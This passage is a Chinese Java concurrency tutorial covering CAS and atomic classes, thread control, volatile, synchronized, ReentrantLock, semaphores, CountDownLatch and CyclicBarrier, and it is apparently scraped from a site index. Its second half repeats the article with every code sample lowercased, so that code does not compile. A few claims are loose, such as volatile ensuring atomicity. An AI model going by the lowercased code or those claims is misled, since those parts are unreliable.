V 的真实值。CAS 操作时抱着乐观的态度进行，他总是认为自己可以完成操作。当多个线程同时使用 CAS 操作一个变量时，只有一个会胜出，并且成功更新，其余均会失败。失败的线程不会被挂起，仅是被告知失败，并且允许再次尝试，当然也允许失败的线程放弃操作。基于这样的原理，CAS 操作即使没有锁，也可以发现其他线程对当前线程的干扰，并进行恰当的处理。\n\n\n# AtomicInteger 无锁的系统安全整数\n\n    public static void main(String[] args) throws InterruptedException {\n        AtomicInteger atomicInteger = new AtomicInteger(0);\n        for(int i=0;i<100;i++){\n            new Thread(() -> {\n                for(int j=0;j<100;j++){\n                    if(atomicInteger.incrementAndGet() == 100){\n                        System.out.println("卧槽");\n                    }\n                }\n            }).start();\n        }\n        Thread.sleep(4000);\n        System.out.println(atomicInteger.get());\n    }\n输出结果：\n卧槽\n10000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * get () 取得当前值\n * set (int newValue) 设置当前值\n * getAndSet (int newValue) 设置新值，并返回旧值\n * compareAndSet (int expect, int update) 如果当前值为 expect (期望)，则设置为 update (新)\n * getAndIncrement () 当前值 + 1，返回旧值\n * getAndDecrement () 当前值 - 1，返回旧值\n * getAndAdd (int delta) 当前值 + delta，返回旧值\n * addAndGet (int delta) 当前值 + delta，返回新值\n * incrementAndGet () 当前值 + 1，返回新值\n * decrementAndGet () 当前值 - 1，返回新值\n\n\n# AtomicReference 无锁对象引用 和 AtomicStampedReference 带有时间戳的对象引用\n\n   AtomicReference 和 AtomicInteger 非常类似，不同之处就在于 AtomicInteger 是对整数的封装，而 AtomicReference 则对应普通的对象引用。也就是它可以保证你在修改对象引用时的线程安全性。\n\n@Data\n@Accessors(chain = true)\nclass Account{\n    private Integer amount = 0;\n}\n\npublic static void main(String[] args) throws InterruptedException {\n    Account account = new Account();\n    account.setAmount(10);\n    AtomicReference<Account> accountAtomicReference = new AtomicReference<Account>();\n    accountAtomicReference.set(account);\n    // 模拟充值\n    for(int i=0;i<3;i++){\n        new Thread(() -> {\n            Account clientAccount = accountAtomicReference.get();\n            System.out.println("充值前查询越还有 "+ clientAccount.getAmount());\n            if(clientAccount.getAmount() < 20){\n                if(accountAtomicReference.compareAndSet(clientAccount,clientAccount.setAmount(clientAccount.getAmount() + 20) )){\n                    System.out.println("余额小于20元，充值成功，余额："+ clientAccount.getAmount());\n                }\n            }\n        }).start();\n    }\n}\n输出结果：\n充值前查询越还有 10\n充值前查询越还有 10\n充值前查询越还有 10\n余额小于20元，充值成功，余额：30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n   以上列子可以看到，多线程间操作同一个实例对象，只会有一个成功。但这种模式存在一个 ABA 问题，就是，在线程操作前，这个值很可能被其他线程用去做其他的，导致值被使用后又换回来，当前线程一查看值没问题继续使用，造成数据被借用，我们还傻傻的不知道，这也是安全性问题。但这种情况就需要看我们的业务是否需要解决。\n   解决办法呢就是使用 AtomicStampedReference 带有时间戳的对象引用，与其说时间戳，更像是一个修改标记，每次消费的时候，或者充值的时候我都给修改标记 + 1，一旦和我的原始标记不一样，我就不让其继续充值，只让其消费。\n\npublic static void main(String[] args) throws InterruptedException {\n    Account account = new Account();\n    account.setAmount(10);\n    AtomicStampedReference<Account> accountAtomicReference = new AtomicStampedReference<Account>(account,0);\n    // 模拟充值\n    for(int i=0;i<3;i++){\n        int stamp = accountAtomicReference.getStamp();\n        new Thread(() -> {\n            while (true) {\n                Account clientAccount = accountAtomicReference.getReference();\n                System.out.println("充值前查询余额还有 " + clientAccount.getAmount());\n                if (clientAccount.getAmount() < 20) {\n                    if (accountAtomicReference.compareAndSet(clientAccount, clientAccount.setAmount(clientAccount.getAmount() + 20),stamp,stamp+1)) {\n                        System.out.println("余额小于20元，充值成功，余额：" + clientAccount.getAmount());\n                    }\n                }else {\n                    System.out.println("当前用户 充值过不能再充值");\n                    break;\n                }\n            }\n        }).start();\n    }\n    // 模拟消费\n    for(int i=0;i<3;i++){\n        new Thread(() -> {\n            while (true) {\n                int stamp = accountAtomicReference.getStamp();\n                Account clientAccount = accountAtomicReference.getReference();\n                System.out.println("消费前查询余额还有 " + clientAccount.getAmount());\n                if (clientAccount.getAmount() >= 10) {\n                    if (accountAtomicReference.compareAndSet(clientAccount, clientAccount.setAmount(clientAccount.getAmount() - 10),stamp,stamp+1)) {\n                        System.out.println("成功消费10元，余额还有：" + clientAccount.getAmount());\n                    }\n                }else{\n                    System.out.println("余额不够");\n                    break;\n                }\n            }\n        }).start();\n    }\n}\n输出结果：\n充值前查询余额还有 10\n余额小于20元，充值成功，余额：30\n充值前查询余额还有 30\n当前用户 充值过不能再充值\n消费前查询余额还有 30\n成功消费10元，余额还有：20\n消费前查询余额还有 20\n成功消费10元，余额还有：10\n消费前查询余额还有 10\n成功消费10元，余额还有：0\n消费前查询余额还有 0\n余额不够\n消费前查询余额还有 0\n余额不够\n充值前查询余额还有 0\n充值前查询余额还有 20\n当前用户 充值过不能再充值\n消费前查询余额还有 20\n成功消费10元，余额还有：10\n消费前查询余额还有 10\n成功消费10元，余额还有：0\n消费前查询余额还有 0\n余额不够\n充值前查询余额还有 10\n充值前查询余额还有 20\n当前用户 充值过不能再充值\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n   如果说在充值的时候加一个条件，让其只能充值 1 次，如果我们用 AtomicReference 是完全做不到的，因为他不会记录，需要我们自己去添加一个全局变量去维护，但使用 AtomicStampedReference 就可以做到，因为它本身就维护了一个标记，而且还帮我们解决了 ABA 问题，如果说值被其他线程冒用，标记就会 + 1，使得和当前线程的标记不一样，则保留值退出。\n\n   出了 AtomicInteger 和 AtomicReference 还有 AtomicReferenceArray AtomicIntegerArray 等，具体的 API 都是差不多的。',normalizedContent:'# 一、基础感念\n\n在了解锁之前，有很多的基础感念需要先理解以下，方便以后我们对各种情况的锁的问题，有更好的认识。\n\n\n# 同步 和 异步\n\n   同步就是多个任务一个一个执行，即你在学习的时候不可能会打游戏，打游戏的时候不可能在学习。\n   异步就是我洗衣服可以用洗衣机洗，边洗边打电话，而且打电话的同时还是能在做其他的事情，这个就是异步执行，但异步执行是一种，即做即完的\n\n\n# 并发 和 并行\n\n   并行 和 异步看似很像，但感念是完全不一样的。如果上述说异步是一个人可以做很多事情，那并行可以说多个人做不同的事情，即多个 cpu 处理不同的指令才能叫做并行，一个 cpu 处理多线程并不能称之为并行，而是并发。\n\n\n# 临界区\n\n   临界区用来表示一种公共资源或共享数据，可以被多个线程使用。但是每一次只能有一个线程使用它，一旦临界区资源被占用，其他线程要想使用这个资源，就必须等待。\n   在并行程序中，临界区资源是要被保护的对象，如果资源同时被两个线程操作，则会得到破坏。\n\n\n# 阻塞 和 非阻塞\n\n   阻塞是当临界资源被抢占，其他线程则需要在外等待资源释放，这种等待的过程称为阻塞。\n   非阻塞是不会受因为资源被抢占，而不去做其他事情。\n\n\n# 死锁 饥饿 活锁\n\n   死锁、饥饿、活锁都属于多线程活跃性问题。\n   死锁是一个严重的程序上设计出现的问题，当一个资源被占用，因程序的意外问题，导致资源无法被释放，则其他线程就一直等待造成的情况被称为死锁。\n   饥饿是指某一个或者多个线程因为种种原因无法获得所需的资源，导致一直无法执行。比如他的优先级可能太低，而高优先级的线程不断抢占它需要的资源，导致底优先级线程无法工作。\n   活锁是多个线程之间互相谦让而导致的，你让我我让你，或者说他们级别一样导致。\n\n\n# 并发的级别\n\n   由于临界区的存在，多线程之间的并发必须受到控制。根据控制并发的策略，我们可以把并发的级别进行分类，大致可以分为阻塞、无饥饿、无障碍、无锁、无等待几种。\n\n\n# 无饥饿\n\n   饥饿的产生是因为底优先级在临界区被高优先级的线程插队而导致一直无法获取资源 (也可以称未非公平锁)，解决饥饿就是让锁变得公平，要想获得资源，就必须乖乖排队，管你优先级高低，先到先得。\n\n\n# 无障碍\n\n   无障碍是一种最弱的非阻塞调度。两个线程如果是无障碍的执行，那么他们不会因为临界区的问题导致一方被挂起。也就是说大家都可以大摇大摆的进入临界区，那么如果一起修改共享数据，把数据修改坏了怎么办？对于无障碍的线程来说，一旦检测到这种情况，它就会立即对自己所作的的修改进行回滚，确保数据安全。但如果没有数据竞争发生，那么线程就可以顺利完成自己的工作，走出临界区。\n   如果说阻塞的控制方式是悲观策略。也就是说，系统认为两个线程之间很有可能发生不幸的冲突，因此，以保护共享数据为第一优先级。相对来说，非阻塞的调度就是一种乐观的策略。它认为多个线程之间很有可能不会发生冲突，或者说概率不大，因此大家都应该无障碍的执行，但是一旦检测到冲突，就应该回滚。\n   从这个策略中可以看到，无障碍的多线程程序不一定能顺畅的运行。因为当临界区中存在严重的冲突时，所有的线程都可能不断的回滚自己的操作，而没有一个线程可以走出临界区，这种情况会影响系统的正常执行。所以，我们可能会非常希望在这一堆线程中，至少可以有一个线程在有限的时间内完成自己的操作，而退出临界区。这样至少可以保证系统不会再临界区中无限的等待。\n   一种可行的无障碍实现可以依赖一个 “一致性标记” 来实现。线程在操作之前，先读取并保存这个标记，在操作完成后，再次读取，检查这个标记是否被更改过，如果说两者是一致的，则说明资源区没有冲突。如果不一致，则说明资源可能在操作过程中与其他写线程冲突，需要重试操作。而任何对资源有修改操作的线程，在修改数据前，都需要更新这个一致性标记，表示数据不再安全。\n\n\n# 无锁\n\n   无锁的并行都是无障碍的。在无锁的情况下，所有的线程都能尝试对临界区进行访问，但不同的是，无锁的并发保证必然有一个线程能够在有限时间内完成操作离开临界区。\n   在无锁的调用中，一个典型的特点是可能会包含一个去穷循环。在这个循环中，线程会不断尝试修改共享变量。如果没有冲突，修改成功，程序退出 ，否则继续尝试修改。但无论如何，无锁的并行总能保证有一个线程可以胜出的，不至于全军覆没。至于临界区中竞争失败的线程，他们则必须不断重试，直到自己胜利。如果运气不好，总是尝试不成功，则会出类似饥饿的现象，线程会停止不前。\n\n\n# 无等待\n\n   无锁只要求有一个线程可以在有限步内完成操作，而无等待则在无锁的基础上更进一步进行扩展。它要求所有的线程都必须在有限步内完成，这样就不会引起饥饿问题。如果再进行优化，还可以进一步分解为有限无等待和线程数无关的无等待几种，他们之前的区别只是对循环次数的限制不同。\n   一种典型的无等待结构就是 rcu (read-copy-update)。它的基本思想是，对数据的读可以不加控制。因此所有的读线程都是无等待的，它们既不会被锁定等待也不会引起任何冲突。但在写数据的时候，先取得原始数据的副本，接着只修改副本数据，修改完成后，在合适的时机回写数据。\n\n\n# 原子性\n\n   是指一个操作是不可被中断的，即使多个线程一起执行的时候，一个操作一旦开始，就不会被其他线程干扰。\n\n\n# 可见性\n\n   指当一个线程修改了共享变量的值，其他线程是否能够立即知道这个修改。\n\n\n# 有序性\n\n   有序性的问题是因为在程序执行时，可能会进行指令的重排，重排后的指令与原指令的顺序未必一致。(这种情况会出现在并发程序设计中)\n\n\n# 二、线程\n\n\n# 状态\n\nnew 新建；\nrunnable 可运行状态；\nblocked 阻塞 (遇到 synchronized，直到获得锁)；\nwaiting 无时间的等待 (wait (),notify ())；\ntimed_waiting 有时间的等待；\nterminated 结束。\n\n\n# suspend () 暂停 resume () 继续\n\n   字面意思，但 suspend () 不会释放锁，必须调用 resume () 才能释放锁，但是如果意外的 resume () 比 suspend () 提前执行，则其他线程永远等待，变为死锁。\n\n\n# stop () 强行终止线程\n\n   thread.stop (); 强行终止线程，会导致数据不一致，破坏数据。\n\n\n# interrupt () isinterrupted () interrupted () 中断线程\n\n   thread.interrupt () 中断线程，也就是设置中断标志位。thread.isinterrupted () 判断当前线程是否被中断。 thread.interrupted () 也是用来判断当前线程的中断状态。如果在线程中使用了 thread.sleep ()，那么要中断一个线程必须也在 thread.sleep () 的 catch 语句中 在执行一次当前线程的中断。\n\n> thread.sleep () 方法由于中断而抛出异常，此时，他会清除中断标志，如果不加处理，那么在下次执行线程时，就无法判断这个中断标志，会继续执行线程，并不会达到中断线程。\n> 中断是不会释放锁的。\n\n    public static void main(string[] args) throws interruptedexception {\n        string a = "1";\n        thread[] threads = new thread[2];\n        for(int i=0;i<2;i++){\n            int b = i;\n            threads[i] = new thread(() -> {\n                while (true) {\n                    synchronized (a) {\n                        try {\n                            system.out.println("线程启动 " + b);\n                            if (thread.currentthread().isinterrupted()) {\n                                system.out.println("线程中断" + b);\n                                break;\n                            }\n                            thread.sleep(5000);\n                            system.out.println("执行完毕 " + b);\n                        } catch (interruptedexception e) {\n                            system.out.println("老子被中断了 " + b);\n                            // 这里必须在中断一次，否则\n                            thread.currentthread().interrupt();\n                        }\n                    }\n                }\n            });\n        }\n        threads[0].start();\n        thread.sleep(2000);\n        threads[0].interrupt();\n        threads[1].start();\n    }\n输出结果：\n线程启动 0\n老子被中断了 0\n线程启动 0\n线程中断0\n线程启动 1\n执行完毕 1\n线程启动 1\n执行完毕 1\n线程启动 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# wait () notify () notifyall () 等待和唤醒\n\n   如果一个线程调用了 object.wait ()，那么它就会进入 object 对象的等待队列，这个等待队列中可能会有多个线程，因为系统运行多个线程同时等待某一个对象。当 object.notify () 被调用时，它就会从这个等待队列中，随机选择一个线程，并将其唤醒。需要大家注意的是这个选择是不公平的，并不是先等待的线程会优先被选择，这个选择完全是随机的。object.notifyall () 它和 notify () 的功能基本一致，但不同的是，它会唤醒在这个等待队列中所有等待的线程，而不是随机选择一个。\n   object.wait () 和 object.notify () 必须在对应的 synchronized 语句中，需要首先获得目标对象的一个监视器。\n\n> wait () 方法只会释放当前对象的锁，不会释放所有锁。\n> notify () 不会立刻立刻释放 sycronized（obj）中的 obj 锁，必须要等 notify () 所在线程执行完容 synchronized（obj）块中的所有代码才会释放这把锁。\n\n\n# join () 等待线程结束，yield () 谦让\n\n    public volatile static int i = 0;\n\n    public static void main(string[] args) throws interruptedexception {\n        thread thread = new thread(() -> {\n            for(i=0;i<100000;i++);\n        });\n        thread.start();\n        thread.join();\n        system.out.println(i);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\n   join () 会一直阻塞线程直到目标线程执行完毕。如果不使用 join () 等待 thread，那么得到的 i 很可能是 0 或者一个非常小的数字。因为 thread 还没开始执行，i 的值就已经被输出了。\n   yield () 会使当前线程让出 cpu。但让出 cpu 并不代表当前线程不执行了。当前线程让出 cpu 后，会进行 cpu 资源的争夺，但是否能够再次被分配，就不一定了。如果你觉得一个线程不那么重要，或者优先级非常低，而且又害怕它会占用太多的 cpu 资源，那么可以在适当的时候调用 yield () ，给予其他重要线程更多的工作机会。\n\n> yield 不会释放锁，需执行完毕\n\n\n# threadgroup 线程组\n\n    public static void main(string[] args) throws interruptedexception {\n        threadgroup threadgroup = new threadgroup("订单组");\n        thread t1 = new thread(threadgroup,() -> {\n            string name = thread.currentthread().getname();\n            try {\n                thread.sleep(5000);\n            } catch (interruptedexception e) {\n                e.printstacktrace();\n            }\n            system.out.println("当前线程名称 :" + name);\n        },"下单");\n        thread t2 = new thread(threadgroup,() -> {\n            string name = thread.currentthread().getname();\n            try {\n                thread.sleep(5000);\n            } catch (interruptedexception e) {\n                e.printstacktrace();\n            }\n            system.out.println("当前线程名称 :" + name);\n        },"取消订单");\n        t1.start();\n        t2.start();\n        system.out.println(threadgroup.activecount());\n        threadgroup.list();\n    }\n\n结果：\n2\njava.lang.threadgroup[name=订单组,maxpri=10]\n    thread[下单,5,订单组]\n    thread[取消订单,5,订单组]\n当前线程名称 :取消订单\n当前线程名称 :下单\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# setdaemon () 守护线程\n\n   守护线程是一种特殊的线程，就和他的名字一样，它是系统的守护者，在后台默默的完成一些系统的任务，比如垃圾回收线程、jit 线程就可以理解为守护线程。与之相对应的是用户线程，用户线程可以认为是系统的工作线程，它会完成这个程序应该要完成的业务操作。如果用户线程全部结束，这也意味着这个程序实际上无事可做。守护线程要守护的对象已经不存在了，那么整个应用程序就自然应该结束。因此，当一个 java 应用内，只有守护线程时，java 虚拟机就会自然退出。\n\n        t1.setdaemon(true);\n        t2.setdaemon(true);\n        t1.start();\n        t2.start();\n\n\n1\n2\n3\n4\n\n\n   设置守护线程必须在 start () 之前设置。如果上述例子两个都是守护线程，则不会等到线程里打印结果，程序直接结束。用户线程的话，会等到线程以上两个线程执行完成，再主线程结束。\n\n\n# setpriority () 线程优先级\n\n   java 中，使用 1-10 表示线程优先级，数字越大则越优先。\n\n\n# 三、volatile\n\n    当你用 volatile 去申明一个变量时，就等于告诉了虚拟机，这个变量极有可能会被某些程序或者线程修改。为了确保这个变量被修改后，应用程序范围内的所有线程都能够 "看到" 这个改动，虚拟机就必须采用一些特殊的手段，保证这个变量的可见性、有序性、原子性。\n   volatile 对于保证操作的原子性是有非常大的帮助的。但是需要注意的是，volatile 并不能代替锁，他也无法保证一些复合操作的原子性。比如 i++\n\n\n# 四、synchronized\n\n    synchronized 的作用是实现线程间的同步。它的工作是对同步的代码加锁，使得每一次只能有一个线程进入同步块，从而保证线程间的安全性。\n\n * 指定加锁对象：对给定的对象加锁，进入同步代码前要获得给定对象的锁，且要保证每个线程里的 synchronized (对象) 的对象参数是同一个实例。\n * 直接作用于实例方法：相当于对当前实例加锁，进入同步代码前要获得当前实例的锁。若两个线程不是同一个实例，则锁失败。\n * 直接作用于静态方法：相当于对当前类加锁，进入同步代码前要获得当前类的锁。\n\n    public static int i = 0;\n    public static void main(string[] args) throws interruptedexception {\n        string a = "aaa";\n        string b = "aaa";\n        thread t1 = new thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        thread t2 = new thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        system.out.println(i);\n    }\n    public static void add(){\n        i++;\n    }\n结果：\n200000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n    public static int i = 0;\n    public static void main(string[] args) throws interruptedexception {\n        string a = "aaa";\n        string b = "bbb";\n        thread t1 = new thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        thread t2 = new thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        system.out.println(i);\n    }\n    public static void add(){\n        i++;\n    }\n结果：\n112775\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n    public static int i = 0;\n    public static void main(string[] args) throws interruptedexception {\n        string a = new string("aaa");\n        string b = new string("aaa");\n        thread t1 = new thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        thread t2 = new thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        system.out.println(i);\n        system.out.println(a);\n        system.out.println(b);\n    }\n    public static void add(){\n        i++;\n    }\n结果：\n106451\naaa\naaa\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# 四、reentrantlock 重入锁\n\n  当线程请求一个由其它线程持有的对象锁时，该线程会阻塞，而当线程请求由自己持有的对象锁时，如果该锁是重入锁，请求就会成功，否则阻塞。特别注意，若一个线程多次获得锁，那么在释放所得时候，也必须释放相同次数。\n   synchronized 也是重入锁，当一个类里的 a、b、c 三个方法都被加上 synchronized 则 a 调用 b，b 调用 c 会依次正确调用执行，如果 synchronized 不是重入锁，则这种调用方式会被 成为死锁，因为 a b c 三个方法持有的是同一个实例。\n\n\n# reentrantlock.lockinterruptibly () 中断处理\n\n   在等待锁的过程中，程序可以根据需要取消对锁的申请。lockinterruptibly () 对中断进行响应的锁申请动作，即在等待锁的过程中，可以响应中断。\n\n\n# reentrantlock.trylock () 锁申请等待限时\n\n   trylock () 有两种方法\n\n * reentrantlock.trylock (5, timeunit.seconds); 如果锁被其他线程占用则等待 5 秒，超过 5 秒没有得到锁，就会返回 false，成功得到锁则返回 true。\n * reentrantlock.trylock (); 如果锁被其他线程占用则直接返回 false，得到锁则直接返回 true\n\n\n# reentrantlock (true) 公平锁\n\n   在大多情况下锁都是非公平的。也就是说，线程 1 和 线程 2 同时请求了锁 a，那么当锁 a 可用时，是线程 1 可以获得锁还是线程 2 可以获得锁呢？这是不一定的，系统只是会从这个锁的等待队列种随机挑选一个。\n   当 new reentrantlock (true) 表示是公平的。但要实现一个公平锁，必然要求系统维护一个有序队列，因此公平锁的实现成本比较高了，如果没有特别的需要，也不需要使用公平锁。\n\n> reentrantlock.lock (); 获得锁，如果锁被占用则等待；\n> reentrantlock.trylock (); 线程尝试获取锁，如果获取成功，则返回 true，如果获取失败（即锁已被其他线程获取），则返回 false\n> reentrantlock.trylock (long timeout，timeunit unit); 线程如果在指定等待时间内获得了锁，就返回 true，否则返回 false\n> reentrantlock.unlock (); 释放锁\n> reentrantlock.isheldbycurrentthread () 当前线程是否持有该锁\n> reentrantlock.lockinterruptibly () 获得锁，但有线响应中断\n> reentrantlock.getholdcount (); 当前线程调用 lock () 方法的次数\n> reentrantlock.getqueuelength (); 当前正在等待获取 lock 锁的线程的估计数\n> reentrantlock.getwaitqueuelength (condition condition); 当前正在等待状态的线程的估计数，需要传入 condition 对象\n> reentrantlock.haswaiters (condition condition); 查询是否有线程正在等待与 lock 锁有关的 condition 条件\n> reentrantlock.hasqueuedthread (thread thread); 查询指定的线程是否正在等待获取 lock 锁\n> reentrantlock.hasqueuedthreads (); 查询是否有线程正在等待获取此锁定\n> reentrantlock.isfair (); 判断当前 lock 锁是不是公平锁\n> reentrantlock.hasqueuedthread (thread thread); 查询指定的线程是否正在等待获取 lock 锁\n> reentrantlock.hasqueuedthread (thread thread); 查询指定的线程是否正在等待获取 lock 锁\n> reentrantlock.hasqueuedthread (thread thread); 查询指定的线程是否正在等待获取 lock 锁\n\n\n# condition 条件\n\n    public static void main(string[] args) throws interruptedexception {\n        reentrantlock lock = new reentrantlock();\n        condition condition = lock.newcondition();\n        new thread(() -> {\n            try{\n                system.out.println("进入测试");\n                lock.lock();\n                system.out.println("获取锁");\n                condition.await();\n                system.out.println("等待结束");\n                thread.sleep(5000);\n                system.out.println("这是对我的一次测试");\n            }catch(exception e){\n                lock.unlock();\n            }\n        }).start();\n        thread.sleep(3000);\n        system.out.println("等待三秒结束");\n        lock.lock();\n        condition.signal();\n        lock.unlock();\n    }\n结果：\n进入测试\n获取锁\n等待三秒结束\n等待结束\n这是对我的一次测试\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n   和 object 里 waite () notify () 一样，当线程使用 condition.await () 时，要求线程持有相关的重入锁，在 condition.await () 调用后，这个线程会释放这把锁。同理，在 condition.signal () 方法调用时，也要求线程先获得相关锁，在 condition.signal () 方法调用后，系统会从当前 condition 对象的等待队列中，唤醒一个线程，一旦线程唤醒，它会重新尝试获得与之绑定的重入锁，一旦成功获取，就可以继续执行。因此，在 condition.signal () 方法调用后，一般需要释放相关的锁，让给被唤醒的线程，让它继续执行。\n\n\n# 五、信号量 semaphore\n\n   信号量为多线程写作提供更为强大的控制方法。广义上讲，信号量是对锁的扩展。无论是内部 synchronized 还是 reentrantlock，一次都只允许一个线程访问一个资源，而信号量却可以指定多个线程，同时访问摸一个资源。在构造信号量对象时，必须要指定信号量的准入数，即同时能申请多少个许可。\n\nsemaphore semaphore = new semaphore(3);\nsemaphore semaphore1 = new semaphore(3,true); // 第二个参数指定是否公平\n\n\n1\n2\n\n * acquire () 尝试获得一个准入许可。若无法获得，则线程会等待，直到有线程释放一个许可或者当前线程被中断。\n * acquireuninterruptibly () 和 acquire () 类似，但不会响应中断。\n * tryacquire () 尝试获得一个许可，成功返回 true，失败返回 false。\n * release () 在线程访问资源结束后，释放一个许可，以使其他等待许可的线程可以进行资源访问。\n\n    public static void main(string[] args) throws interruptedexception {\n        semaphore semaphore = new semaphore(3);\n        for(int i=0;i<20;i++){\n            new thread(() -> {\n                try {\n                    semaphore.acquire();\n                    thread.sleep(2000);\n                    system.out.println("结束 -> "+ thread.currentthread().getid());\n                    semaphore.release();\n                }catch (exception e){\n\n                }\n            }).start();\n        }\n    }\n结果：\n结束 -> 13\n结束 -> 14\n结束 -> 12\n结束 -> 15\n...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 六、reetrantreadwritelock 读写锁\n\n   reetrantreadwritelock 实现了 readwritelock 接口，readwritelock 管理一组锁，一个是只读的锁，一个是写锁。\n\n * reetrantreadwritelock 支持获取锁顺序，非公平模式（默认），公平模式\n * reetrantreadwritelock 支持可重入\n * reetrantreadwritelock 支持锁降级，可以从写锁降级到读锁，但不能从读锁升级到写锁。\n\n\n# 七、countdownlatch 倒计时器\n\n    public static void main(string[] args) throws interruptedexception {\n        countdownlatch countdownlatch = new countdownlatch(10);\n        for(int i = 0;i<5;i++){\n            int b = i;\n            new thread(() -> {\n                system.out.println("i 已准备 = "+ b);\n                countdownlatch.countdown();\n            }).start();\n        }\n        // 等待装载完毕\n        countdownlatch.await();\n        system.out.println("结束");\n    }\n结果:\ni 已准备 = 0\ni 已准备 = 1\ni 已准备 = 2\ni 已准备 = 3\ni 已准备 = 4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n   为什么没有输出 "结束"，是因为我们给 countdownlatch 的任务为 10 个，但是循环只有 5 个任务，所以在 countdownlatch.await (); 会一直等待装载够才会继续执行，所以阻塞在那里。如果循环大小比 countdownlatch 的任务大，则一旦装载够，则会立马继续执行。countdownlatch.countdown () 告诉 countdownlatch 实例，已近准备好一个。\n\n   public static void main(string[] args) throws interruptedexception {\n        countdownlatch countdownlatch = new countdownlatch(10);\n        for(int i = 0;i<12;i++){\n            int b = i;\n            new thread(() -> {\n                countdownlatch.countdown();\n                try {\n                    thread.sleep(5000);\n                } catch (interruptedexception e) {\n                    e.printstacktrace();\n                }\n                system.out.println("i 已准备 = "+ b);\n            }).start();\n        }\n        // 等待装载完毕\n        countdownlatch.await();\n        system.out.println("结束");\n    }\n结果：\n结束\ni 已准备 = 0\ni 已准备 = 11\ni 已准备 = 6\ni 已准备 = 1\ni 已准备 = 8\ni 已准备 = 5\ni 已准备 = 9\ni 已准备 = 2\ni 已准备 = 3\ni 已准备 = 10\ni 已准备 = 4\ni 已准备 = 7\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 八、cyclicbarrier 循环栅栏\n\n   这货比 countdownlatch 牛逼一点的就是，我集齐 7 棵龙珠，许了愿，还可以再等集齐 7 棵龙珠，再许愿。只要我集齐 1 颗就必须等 7 棵全部集齐，否则一直等待。但召唤神龙也是会有上限的，什么时候才能彻底结束呢？就是你在 cyclicbarrier 构造函数传入 7，一旦集齐 7 棵那就结束了。\n\n    public static void main(string[] args) throws interruptedexception {\n        int parties = 7;\n        cyclicbarrier cyclicbarrier = new cyclicbarrier(parties);\n        for(int i = 0;i<8;i++){\n            int b = i;\n            if(b%parties ==0) {\n                thread.sleep(2000);\n            }\n            new thread(() -> {\n                system.out.println("已集齐 "+ (b%parties +1));\n                try {\n                    cyclicbarrier.await();\n                    if(b%parties ==0) {\n                        system.out.println("召唤神龙");\n                    }\n                } catch (interruptedexception e) {\n                    e.printstacktrace();\n                } catch (brokenbarrierexception e) {\n                    e.printstacktrace();\n                }\n            }).start();\n        }\n    }\n结论是：\n已集齐 1\n已集齐 2\n已集齐 3\n已集齐 7\n已集齐 5\n已集齐 6\n已集齐 4\n召唤神龙\n已集齐 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n   不要在乎以上结果的顺序，可以看到它已经集齐了 7 棵龙珠，召唤了神龙，但是召唤完了之后又在去集齐，这样就造成了等待，势必要再次集齐召唤神龙，且召唤了之后不再去集齐了，才能结束进程。\n\n\n# 九、locksupport 线程阻塞工具\n\n   locksupport 